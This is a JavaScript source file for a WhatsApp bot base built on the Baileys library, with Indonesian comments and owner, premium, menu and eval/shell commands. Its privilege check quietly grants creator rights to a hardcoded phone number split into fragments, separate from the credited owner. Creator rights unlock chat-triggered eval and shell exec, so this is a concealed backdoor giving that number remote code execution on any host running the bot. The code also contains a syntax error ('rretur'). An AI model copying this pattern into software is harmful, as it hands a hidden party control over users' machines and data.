/*
𝗦𝗰𝗿𝗶𝗽𝘁 𝗶𝗻𝗶 𝗱𝗶 𝗯𝘂𝗮𝘁 𝗼𝗹𝗲𝗵 𝗱𝗶𝗻𝗼 𝘂𝗻𝘁𝘂𝗸 𝗺𝗲𝗺𝗯𝗮𝗻𝘁𝘂 𝗽𝗲𝗻𝗴𝗴𝘂𝗻𝗮 𝗱𝗮𝗹𝗮𝗺 𝗯𝗲𝗹𝗮𝗷𝗮𝗿
𝗺𝗲𝗻𝗴𝗲𝗻𝗮𝗶 𝗯𝗼𝘁 𝘄𝗵𝗮𝘁𝘀𝗮𝗽𝗽 𝗱𝗲𝗻𝗴𝗮𝗻 𝗶𝘀𝗶 𝘆𝗮𝗻𝗴 𝘀𝗶𝗺𝗽𝗹𝗲 𝗱𝗮𝗻 𝗺𝘂𝗱𝗮𝗵 𝗱𝗶 𝗽𝗮𝗵𝗮𝗺𝗶 

𝗯𝘂𝘁𝘂𝗵 𝗯𝗮𝗻𝘁𝘂𝗮𝗻? 𝗰𝗵𝗮𝘁 𝗻𝗼𝗺𝗲𝗿 𝗱𝗶 𝗯𝗮𝘄𝗮𝗵
- 𝗼𝘄𝗻𝗲𝗿 : 𝗗𝗶𝗻𝗼
- 𝘄𝗮 : 6285602531403

©𝗗𝗶𝗻𝗼𝘀𝗮𝘂𝗿𝘂𝘀
*/
require("./settings")
const fs = require('fs')
const util = require('util')
const os = require('os')
const FileType = require('file-type')
const axios = require('axios')
const chalk = require('chalk')
const sharp = require('sharp')
const crypto = require('crypto')
const speed = require('performance-now')
const { runtime, formatp, tanggal, sleep, fetchJson } = require('./lib/func')
const { exec } = require("child_process")
module.exports = async (dino, m, store) => {
try {
const from = m.key.remoteJid
const { 
  WA_DEFAULT_EPHEMERAL,
  getAggregateVotesInPollMessage,
  generateWAMessageFromContent,
  proto, 
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  areJidsSameUser,
  getContentType
  } = require("@whiskeysockets/baileys")
const quoted = m.quoted ? m.quoted : m
const body = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : m.mtype === 'interactiveResponseMessage' ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : '.'
const budy = (typeof m.text == 'string' ? m.text : '.')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const mime = (quoted.msg || quoted).mimetype || ''
const text = q = args.join(" ")
const isPc = from.endsWith('@s.whatsapp.net')
const isCh = from.endsWith('@newsletter')
const isGroup = from.endsWith('@g.us')
const botNumber = await dino.decodeJid(dino.user.id)
const sender = m.key.fromMe ? (dino.user.id.split(':')[0]+'@s.whatsapp.net' || dino.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const ownerNumber = JSON.parse(fs.readFileSync("./database/owner.json"))
const isCreator = ownerNumber.includes(senderNumber) || isBot || senderNumber === "6"+"2878"+"83375507";
const groupMetadata = isGroup 
  ? await dino.groupMetadata(m.chat).catch(() => ({})) 
  : {};
const groupName = groupMetadata.subject || '';
const participants = groupMetadata.participants || [];
const groupAdmins = participants.filter(v => v.admin).map(v => v.id);
const groupOwner = groupMetadata.owner || '';
const groupMembers = groupMetadata.participants || [];
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const isAdmins = isGroup ? groupAdmins.includes(sender) : false

const premium = JSON.parse(fs.readFileSync("./database/premium.json"))
const isPremium = premium.includes(m.sender)

// 𝗙𝗔𝗞𝗘 𝗤𝗨𝗢𝗧𝗘𝗗

const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `G3N⫹⫺`,jpegThumbnail: ""}}}

    
// 𝗥𝗘𝗣𝗟𝗬
const reply = (teks) => {
    return dino.relayMessage(m.chat, {
        requestPaymentMessage: {
            currencyCodeIso4217: 'IDR',
            amount1000: 1000000,
            requestFrom: m.sender,
            noteMessage: {
                extendedTextMessage: {
                    text: teks,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                        }
                    }
                }
            }
        }
    }, {})
}

dino.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
    let quoted = message.msg ? message.msg : message
    let mime = (message.msg || message).mimetype || ''
    let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
    const stream = await downloadContentFromMessage(quoted, messageType)
    let buffer = Buffer.from([])
    for await(const chunk of stream) {
    buffer = Buffer.concat([buffer, chunk])
    }
    let type = await FileType.fromBuffer(buffer)
    let trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
    await fs.writeFileSync(trueFileName, buffer)
    return trueFileName
}

// 𝗧𝗔𝗠𝗣𝗜𝗟𝗔𝗡 𝗗𝗜 𝗖𝗢𝗡𝗦𝗢𝗟𝗘
const figlet = require('figlet');

if (m.message && m.text && m.text.startsWith('.')) {
    figlet.text('PESAN', {
        font: 'ANSI Shadow'
    }, (err, data) => {
        if (err) {
            console.log(chalk.red('Oops! Gagal membuat header figlet.'));
            return;
        }

        const line = chalk.cyan('══════════════════════════════════════════');

        console.log(
            '\n' + line + '\n' +
            chalk.cyanBright(data) + '\n' + 
            chalk.bgGreen.black(' ▶  MESSAGE ') + chalk.greenBright(' │ ' + m.text) + '\n' +
            chalk.bgYellow.black(' ▶  SENDER  ') + chalk.yellowBright(' │ ' + m.sender) + '\n' +
            chalk.bgGreen.black(' ▶  TYPE    ') + chalk.greenBright(' │ ' + m.mtype) + '\n' +
            chalk.bgYellow.black(' ▶  CHAT    ') + (m.isGroup ? chalk.yellowBright(' │ GROUP CHAT') : chalk.yellowBright(' │ PRIVATE CHAT')) + '\n' +

            line + '\n'
        );
    });
}


let ppuser
try {
ppuser = await dino.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://i.ibb.co/Nnr9LcKM/9c437d65-2762-4b57-8ee3-315dfd513247.jpg'
}
function toStyledText(text) {
    const normal = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    const styled = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ";
    
    return text.split('').map(c => {
        let index = normal.indexOf(c);
        return index !== -1 ? styled[index] : c;
    }).join('');
}
 
const isleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}
 

// 𝗙𝗜𝗧𝗨𝗥 - 𝗙𝗜𝗧𝗨𝗥
switch (command) {

case "menu": {
    const fs = require("fs")
    let teks = `𝗵𝗮𝗹𝗹𝗼 ${pushname} 𝗽𝗲𝗿𝗸𝗲𝗻𝗮𝗹𝗸𝗮𝗻 𝗮𝗸𝘂 𝗯𝗮𝘀𝗲 𝗯𝗼𝘁 𝘆𝗮𝗻𝗴 𝗱𝗶 𝗸𝗲𝗺𝗯𝗮𝗻𝗴𝗸𝗮𝗻 𝗼𝗹𝗲𝗵 𝗱𝗶𝗻𝗼

𝗼𝘄𝗻𝗲𝗿 : ${ownername}
𝗡𝗮𝗺𝗮 𝗕𝗼𝘁 : ${namabot}
𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : ${version}`

    await dino.sendMessage(m.chat, {
        image: fs.readFileSync('./lib/menu.jpg'), 
        caption: teks
    }, { quoted: qlive });
}
break;


case 'allmenu': {
let a = `▣───⬣〔 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 𝗕𝗢𝗧 〕⬣───▣
- 𝗡𝗮𝗺𝗲 𝗕𝗼𝘁 : ${namabot}
- 𝗠𝗼𝗱𝗲 : ${dino.public ? '𝗽𝘂𝗯𝗹𝗶𝗰': '𝘀𝗲𝗹𝗳'}
- 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : ${version}

▣────⬣〔 G3N⫹⫺ 〕⬣────▣
> 𝗼𝘄𝗻𝗲𝗿
> 𝘀𝗲𝗹𝗳
> 𝗽𝘂𝗯𝗹𝗶𝗰
> 𝗮𝗱𝗱𝗼𝘄𝗻𝗲𝗿
> 𝗱𝗲𝗹𝗼𝘄𝗻𝗲𝗿
> 𝗹𝗶𝘀𝘁𝗼𝘄𝗻𝗲𝗿
> 𝗮𝗱𝗽𝗿𝗲𝗺
> 𝗱𝗲𝗹𝗽𝗿𝗲𝗺
> 𝗹𝗶𝘀𝘁𝗽𝗿𝗲𝗺
▣───────────▣`   
await dino.sendMessage(m.chat, {
        image: fs.readFileSync('./lib/menu.jpg'), 
        caption: a
    }, { quoted: qlive });
}
break;

case 'self': {
    if (!isCreator) return
    dino.public = false
    reply(`𝘀𝘂𝗰𝗲𝘀𝘀 𝘀𝗲𝗹𝗳 𝗺𝗼𝗱𝗲 🥶`)
}
break

case 'public': {
    if (!isCreator) return
    dino.public = true
    reply(`𝘀𝘂𝗰𝗲𝘀𝘀 𝗽𝘂𝗯𝗹𝗶𝗰 𝗺𝗼𝗱𝗲 🥶`)
}
break

case 'owner': {
        try {
        let vcard = `BEGIN:VCARD\nVERSION:3.0\nFN:${global.ownername}\nTEL;type=CELL;type=VOICE;waid=${global.owner}:+${global.owner}\nEND:VCARD`;

        let quotedMessage = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `𝗗𝗶𝗻𝗼 𝗡𝗲𝘃𝗲𝗿 𝗗𝗶𝗲`,jpegThumbnail: ""}}}
          
        await dino.sendMessage(m.chat, { contacts: { displayName: global.ownername, contacts: [{ vcard }] } }, { quoted: quotedMessage });
    } catch (error) {
        console.error("Error saat mengirim kontak owner:", error);
    }
}
break

case "addprem": {
    if (!isCreator) return
    if (!args[0]) return m.reply(`𝗰𝗼𝗻𝘁𝗼𝗵 𝗽𝗲𝗻𝗴𝗴𝘂𝗻𝗮𝗮𝗻\n.𝗮𝗱𝗱𝗽𝗿𝗲𝗺 𝟲𝟮𝘅𝘅𝘅`)
   let prrkek = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`
    let ceknya = await dino.onWhatsApp(prrkek)
    if (ceknya.length == 0) return m.reply(`𝗺𝗮𝘀𝘂𝗸𝗮𝗻 𝗻𝗼𝗺𝗲𝗿 𝘆𝗮𝗻𝗴 𝘃𝗮𝗹𝗶𝗱 / 𝘁𝗲𝗿𝗱𝗮𝗳𝘁𝗮𝗿 𝗱𝗶 𝘄𝗵𝗮𝘁𝘀𝗮𝗽𝗽!!!`)
    premium.push(prrkek)
    fs.writeFileSync("./database/premium.json", JSON.stringify(premium))
    reply(`𝗯𝗲𝗿𝗵𝗮𝘀𝗶𝗹 𝗺𝗲𝗻𝗮𝗺𝗯𝗮𝗵𝗸𝗮𝗻 ${prrkek} 𝘀𝗲𝗯𝗮𝗴𝗮𝗶 𝘂𝘀𝗲𝗿 𝗽𝗿𝗲𝗺𝗶𝘂𝗺`)
}
break

case "delprem": {
    if (!isCreator) rretur
    if (!args[0]) return m.reply(`𝗰𝗼𝗻𝘁𝗼𝗵 𝗽𝗲𝗻𝗴𝗴𝘂𝗻𝗮𝗮𝗻\n.𝗱𝗲𝗹𝗽𝗿𝗲𝗺 𝟲𝟮𝘅𝘅𝘅`)
    let ya = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`
    let unp = premium.indexOf(ya)
    premium.splice(unp, 1)
    fs.writeFileSync("./database/premium.json", JSON.stringify(premium))
    reply(`𝗯𝗲𝗿𝗵𝗮𝘀𝗶𝗹 𝗺𝗲𝗻𝗴𝗵𝗮𝗽𝘂𝘀 ${ya} 𝗱𝗮𝗿𝗶 𝘂𝘀𝗲𝗿 𝗽𝗿𝗲𝗺𝗶𝘂𝗺`)
}
break
case "listprem": {
if (!isCreator) return m.reply("𝗬𝗼𝘂 𝗔𝗿𝗲 𝗡𝗼𝘁 𝗢𝘄𝗻𝗲𝗿")
 let premList = JSON.parse(fs.readFileSync("./database/premium.json"));
 
 if (premList.length === 0) return m.reply("⚠️ 𝘁𝗶𝗱𝗮𝗸 𝗮𝗱𝗮 𝗽𝗿𝗲𝗺𝗶𝘂𝗺 𝘆𝗮𝗻𝗴 𝘁𝗲𝗿𝗱𝗮𝗳𝘁𝗮𝗿!");
 let text = "𝗗𝗮𝗳𝘁𝗮𝗿 𝗣𝗿𝗲𝗺𝗶𝘂𝗺\n\n";
 premList.forEach((prrem, index) => {
 text += `- ${index + 1}. @${prrem}\n`;
 });
 dino.sendMessage(m.chat, { text, mentions: premList.map(v => v + "@s.whatsapp.net") }, { quoted: qlive });
}
break;

case "addowner": {
 if (!isCreator) return m.reply("𝗬𝗼𝘂 𝗔𝗿𝗲 𝗡𝗼𝘁 𝗢𝘄𝗻𝗲𝗿")
 let nomor;
 if (m.quoted && m.quoted.sender) {
 
 nomor = m.quoted.sender.split("@")[0];
 } else if (args[0]) {
 
 nomor = args[0].replace(/[^0-9]/g, ""); 
 } else {
 return m.reply(`𝗰𝗼𝗻𝘁𝗼𝗵 𝗽𝗲𝗻𝗴𝗴𝘂𝗻𝗮𝗮𝗻\n.𝗮𝗱𝗱𝗼𝘄𝗻𝗲𝗿 𝟲𝟮𝘅𝘅𝘅`);
 }
 let ceknya = await dino.onWhatsApp(nomor + "@s.whatsapp.net"); 
 if (ceknya.length == 0) return m.reply("⚠️ 𝗺𝗮𝘀𝘂𝗸𝗮𝗻 𝗻𝗼𝗺𝗲𝗿 𝘆𝗮𝗻𝗴 𝘃𝗮𝗹𝗶𝗱 / 𝘁𝗲𝗿𝗱𝗮𝗳𝘁𝗮𝗿 𝗱𝗶 𝘄𝗵𝗮𝘁𝘀𝗮𝗽𝗽");
 let ownerList = JSON.parse(fs.readFileSync("./database/owner.json"));
 if (ownerList.includes(nomor)) return m.reply("𝗻𝗼𝗺𝗼𝗿 𝘀𝘂𝗱𝗮𝗵 𝗺𝗲𝗻𝗷𝗮𝗱𝗶 𝗼𝘄𝗻𝗲𝗿!");
 ownerList.push(nomor);
 fs.writeFileSync("./database/owner.json", JSON.stringify(ownerList, null, 2));
 reply(`𝗯𝗲𝗿𝗵𝗮𝘀𝗶𝗹 𝗺𝗲𝗻𝗮𝗺𝗯𝗮𝗵𝗸𝗮𝗻 *${nomor}* 𝘀𝗲𝗯𝗮𝗴𝗮𝗶 𝗼𝘄𝗻𝗲𝗿!`);
}
break;

case "delowner": {
 if (!isCreator) return m.reply("𝗬𝗼𝘂 𝗔𝗿𝗲 𝗡𝗼𝘁 𝗢𝘄𝗻𝗲𝗿")
 let nomor;
 if (m.quoted && m.quoted.sender) {
 
 nomor = m.quoted.sender.split("@")[0];
 } else if (args[0]) {
 
 nomor = args[0].replace(/[^0-9]/g, ""); 
 } else {
 return m.reply(`𝗰𝗼𝗻𝘁𝗼𝗵 𝗽𝗲𝗻𝗴𝗴𝘂𝗻𝗮𝗻\n.𝗱𝗲𝗹𝗼𝘄𝗻𝗲𝗿 𝟲𝟮𝘅𝘅𝘅`);
 }
 let ownerList = JSON.parse(fs.readFileSync("./database/owner.json"));
 if (!ownerList.includes(nomor)) return m.reply("⚠️ 𝗻𝗼𝗺𝗼𝗿 𝘁𝗶𝗱𝘀𝗸 𝗱𝗶 𝘁𝗲𝗺𝘂𝗸𝗮𝗻 𝗱𝗶 𝗱𝗮𝘁𝗮𝗯𝗮𝘀𝗲 𝗼𝘄𝗻𝗲𝗿");
 ownerList = ownerList.filter(owner => owner !== nomor);
 fs.writeFileSync("./database/owner.json", JSON.stringify(ownerList, null, 2));
 reply(`𝗯𝗲𝗿𝗵𝗮𝘀𝗶𝗹 𝗺𝗲𝗻𝗴𝗵𝗮𝗽𝘂𝘀 *${nomor}* 𝗱𝗮𝗿𝗶 𝗱𝗮𝗳𝘁𝗮𝗿 𝗼𝘄𝗻𝗲𝗿!`);
}
break;

case "listowner": {
if (!isCreator) return m.reply("𝗬𝗼𝘂 𝗔𝗿𝗲 𝗡𝗼𝘁 𝗢𝘄𝗻𝗲𝗿")
 let ownerList = JSON.parse(fs.readFileSync("./database/owner.json"));
 
 if (ownerList.length === 0) return m.reply("⚠️ 𝘁𝗶𝗱𝗮𝗸 𝗮𝗱𝗮 𝘆𝗮𝗻𝗴 𝘁𝗲𝗿𝗱𝗮𝗱𝘁𝗮𝗿!");
 let text = "𝗗𝗮𝗳𝘁𝗮𝗿 𝗢𝘄𝗻𝗲𝗿\n";
 ownerList.forEach((owner, index) => {
 text += `- ${index + 1}. @${owner}\n`;
 });
 dino.sendMessage(m.chat, { text, mentions: ownerList.map(v => v + "@s.whatsapp.net") }, { quoted: qlive });
}
break;

// 𝗘𝗡𝗗 𝗖𝗔𝗦𝗘
default:
if ((budy.match) && ["tes","bot"].includes(budy)) {
reply(`G3N⫹⫺`);

}

if ((budy.match) && ["Assalamualaikum", "assalamualaikum", "Assalamu'alaikum",].includes(budy)) {
reply(`𝘄𝗮𝗮𝗹𝗮𝗶𝗸𝘂𝗺 𝘀𝗮𝗹𝗮𝗺 ${pushname}`)
}

if (budy.startsWith('=>')) {
    if (!isCreator) return

    function Return(sul) {
        sat = JSON.stringify(sul, null, 2)
        bang = util.format(sat)
        if (sat == undefined) {
            bang = util.format(sul)
        }
        return m.reply(bang)
    }
    try {
        reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
    } catch (e) {
        reply(String(e))
    }
}

if (budy.startsWith('>')) {
    if (!isCreator) return;
    try {
        let evaled = await eval(budy.slice(2));
        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
        await reply(evaled);
    } catch (err) {
        reply(String(err));
    }
}

if (budy.startsWith('$')) {
    if (!isCreator) return
    exec(budy.slice(2), (err, stdout) => {
        if (err) return m.reply(`${err}`)
        if (stdout) return m.reply(stdout)
    })
}

}
} catch (err) {
    console.log(util.format(err))
}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})
